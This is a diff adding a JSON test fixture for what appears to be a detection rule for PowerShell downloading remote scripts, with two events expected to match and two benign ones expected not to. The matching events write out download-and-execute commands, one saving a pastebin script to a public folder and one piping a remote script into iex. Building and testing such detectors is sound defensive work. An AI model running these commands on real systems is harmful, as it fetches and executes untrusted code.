@@ -1,0 +1,6 @@
+[
+  {"expect_match": true, "event": {"Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "CommandLine": "powershell.exe -nop -c Invoke-WebRequest https://pastebin.com/raw/aB12cD34 -OutFile C:\\Users\\Public\\p.ps1"}},
+  {"expect_match": true, "event": {"Image": "C:\\Program Files\\PowerShell\\7\\pwsh.exe", "CommandLine": "pwsh.exe -c iwr https://raw.githubusercontent.com/example/tool/main/run.ps1 | iex"}},
+  {"expect_match": false, "event": {"Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "CommandLine": "powershell.exe -c Invoke-WebRequest https://intranet.example.local/update.zip -OutFile C:\\Temp\\u.zip"}},
+  {"expect_match": false, "event": {"Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "CommandLine": "chrome.exe https://discord.com/app"}}
+]
